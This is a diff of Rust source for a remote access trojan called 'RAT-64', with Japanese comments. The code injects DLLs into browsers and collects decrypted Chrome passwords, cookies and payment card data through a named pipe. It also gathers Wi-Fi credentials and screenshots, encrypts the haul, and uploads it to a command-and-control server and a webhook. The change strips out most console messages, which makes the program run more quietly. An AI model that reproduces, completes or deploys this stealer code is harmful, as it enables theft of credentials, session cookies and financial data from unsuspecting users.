@@ -60,10 +60,7 @@ struct ChromeDecryptResult {
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    println!("🦀 RAT-64 起動中...");
-    
     let config = load_config_or_default();
-    println!("✅ 設定読み込み完了");
     
     if let Err(e) = rat_64::core::config::validate_config(&config) {
         println!("❌ 設定エラー: {}", e);
@@ -76,7 +73,6 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let dll_browser_data = collect_browser_data_via_dll().await;
     
     // データ収集とC2処理
-    println!("🔍 データ収集開始...");
     if let Err(e) = perform_main_data_collection(&config, &mut c2_client, dll_browser_data.as_ref()).await {
         eprintln!("❌ データ収集エラー: {}", e);
         return Ok(());
@@ -97,13 +93,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 /// ブラウザDLL注入でデータ収集（Windows専用）
 #[cfg(windows)]
 async fn collect_browser_data_via_dll() -> Option<BrowserData> {
-    println!("🌐 ブラウザDLL注入処理開始 (IPC版)...");
-    
     // 従来のDLL注入とIPC受信を組み合わせ
     match BrowserInjector::new() {
         Ok(injector) => {
             // IPCサーバーとDLL注入の並行実行
-            println!("📡 IPCサーバー起動中...");
             
             // IPCサーバーをバックグラウンドで開始
             let ipc_handle = tokio::spawn(async {
@@ -117,32 +110,21 @@ async fn collect_browser_data_via_dll() -> Option<BrowserData> {
             match injector.inject_all_browsers().await {
                 Ok(mut browser_data) => {
                     // IPCデータの受信を待機（タイムアウト付き）
-                    println!("📡 IPCデータ受信待機中...");
-                    
                     match tokio::time::timeout(
                         tokio::time::Duration::from_secs(10),
                         ipc_handle
                     ).await {
                         Ok(Ok(Some(ipc_result))) => {
                             integrate_ipc_data(&mut browser_data, &ipc_result);
-                            println!("✅ DLL注入+IPC統合処理完了");
                         }
-                        Ok(Ok(None)) => {
-                            println!("⚠️ IPCデータを受信できませんでした");
-                        }
-                        Ok(Err(e)) => {
-                            println!("⚠️ IPC受信エラー: {}", e);
-                        }
-                        Err(_) => {
-                            println!("⚠️ IPC受信タイムアウト");
-                        }
+                        Ok(Ok(None)) => {}
+                        Ok(Err(_)) => {}
+                        Err(_) => {}
                     }
                     
-                    println!("✅ DLL注入処理完了");
                     Some(browser_data)
                 }
-                Err(e) => {
-                    println!("❌ DLL注入エラー: {}", e);
+                Err(_) => {
                     None
                 }
             }
@@ -216,21 +198,16 @@ async fn receive_ipc_data() -> Option<ChromeDecryptResult> {
             return None;
         }
         
-        println!("📡 IPCサーバー開始：DLLからの接続を待機中...");
-        
         // DLLからの接続を待機（タイムアウト設定）
         let result = ConnectNamedPipe(pipe_handle, ptr::null_mut());
         if result == 0 {
             let error = GetLastError();
             // ERROR_PIPE_CONNECTED (535) は既に接続済みを意味する
             if error != 535 {
-                println!("⚠️ DLL接続の待機中にエラー: {}", error);
                 CloseHandle(pipe_handle);
                 return None;
             }
         }
-        
-        println!("✅ DLLが接続されました");
         
         // データ受信
         let mut buffer = vec![0u8; 1024 * 1024]; // 1MB受信バッファ
@@ -256,16 +233,13 @@ async fn receive_ipc_data() -> Option<ChromeDecryptResult> {
             
             match serde_json::from_str::<ChromeDecryptResult>(&json_data) {
                 Ok(result) => {
-                    println!("✅ IPCデータ受信完了：{} プロファイル", result.profiles.len());
                     Some(result)
                 }
-                Err(e) => {
-                    println!("⚠️ IPCデータのパースエラー: {}", e);
+                Err(_) => {
                     None
                 }
             }
         } else {
-            println!("⚠️ IPCで受信したデータが空");
             None
         }
     }
@@ -275,8 +249,6 @@ async fn receive_ipc_data() -> Option<ChromeDecryptResult> {
 #[cfg(windows)]
 fn integrate_ipc_data(browser_data: &mut BrowserData, ipc_result: &ChromeDecryptResult) {
     use rat_64::services::{DllPasswordOut, DllCookieOut, DllPaymentOut};
-    
-    println!("🔗 IPCデータを統合中...");
     
     for profile in &ipc_result.profiles {
         // パスワード統合
@@ -313,16 +285,12 @@ fn integrate_ipc_data(browser_data: &mut BrowserData, ipc_result: &ChromeDecrypt
         }
     }
     
-    println!("✅ IPC統合完了：{} プロファイル、合計 {} アイテム", 
-        ipc_result.profiles.len(), 
-        ipc_result.total_cookies + ipc_result.total_passwords + ipc_result.total_payments
-    );
+
 }
 
 /// DLL注入で収集したブラウザデータをメインペイロードに統合
 #[cfg(windows)]
 fn integrate_dll_browser_data(payload: &mut IntegratedPayload, dll_data: &BrowserData) {
-    println!("🔗 DLL注入データ統合中...");
     
     // パスワード統合
     for password in &dll_data.passwords {
@@ -349,9 +317,7 @@ fn integrate_dll_browser_data(payload: &mut IntegratedPayload, dll_data: &Browse
         ));
     }
     
-    let total = dll_data.passwords.len() + dll_data.cookies.len() + dll_data.payments.len();
-    println!("   ✅ DLL統合: {}件 (パスワード:{}, クッキー:{}, 支払い:{})", 
-        total, dll_data.passwords.len(), dll_data.cookies.len(), dll_data.payments.len());
+
 }
 
 /// メインのデータ収集処理
@@ -370,21 +336,14 @@ async fn perform_main_data_collection(
         integrate_dll_browser_data(&mut payload, dll_data);
     }
     
-    let final_count = payload.auth_data.passwords.len();
-    println!("✅ データ収集完了: システム:{}, 認証:{}件, ネットワーク情報:{}件, スクリーン:{}件",
-        payload.system_info.hostname,
-        final_count,
-        payload.auth_data.wifi_creds.len(),
-        payload.screenshot_data.as_ref().map(|s| s.total_count).unwrap_or(0)
-    );
+    println!("✅ データ収集完了: {}件", payload.auth_data.passwords.len());
     
     // データ暗号化・保存・送信
     process_and_save_data(payload, config, c2_client).await?;
     
     // 実行結果サマリー
-    println!("� 実行結果サマリー:");
     match execute_rat_operations(&config).await {
-        Ok(summary) => println!("{}", summary),
+        Ok(_) => {},
         Err(e) => println!("❌ サマリー生成エラー: {}", e),
     }
     
@@ -398,40 +357,30 @@ async fn process_and_save_data(
     config: &rat_64::Config, 
     c2_client: &mut C2Client
 ) -> Result<(), Box<dyn std::error::Error>> {
-    println!("🔒 データ暗号化中...");
-    
     let serialized = to_msgpack_vec(&payload)?;
     let (key, nonce) = generate_key_pair();
     let encrypted = encrypt_data_with_key(&serialized, &key, &nonce)?;
     payload.set_encryption_info(&key, &nonce);
     
-    // キー/ナンス情報をコンソールに出力
+    // キー/ナンス情報をファイルに保存
     let key_b64 = STANDARD_NO_PAD.encode(&key);
     let nonce_b64 = STANDARD_NO_PAD.encode(&nonce);
-    println!("🔑 暗号化キー: {}", key_b64);
-    println!("🎲 ナンス: {}", nonce_b64);
-    
-    // キー/ナンス情報をファイルに保存
     std::fs::write("key.txt", &key_b64)?;
     std::fs::write("nonce.txt", &nonce_b64)?;
-    
-    println!("✅ データ暗号化完了 ({}バイト)", encrypted.len());
     
     // C2アップロード
     if config.command_server_enabled {
         match c2_client.upload_collected_data(&payload).await {
-            Ok(()) => println!("✅ データサーバーアップロード成功"),
+            Ok(()) => println!("📤 Data uploaded successfully"),
             Err(e) => println!("❌ データサーバーアップロード失敗: {}", e),
         }
     }
     
     // ファイル保存
     std::fs::write("data.dat", &encrypted)?;
-    println!("💾 暗号化データをdata.datに保存完了");
     
     // Webhook送信
     if config.webhook_enabled {
-        println!("📡 Webhook送信中...");
         match send_unified_webhook(&payload, &config).await {
             Ok(()) => println!("✅ Webhook送信成功"),
             Err(e) => println!("❌ Webhook送信失敗: {}", e),
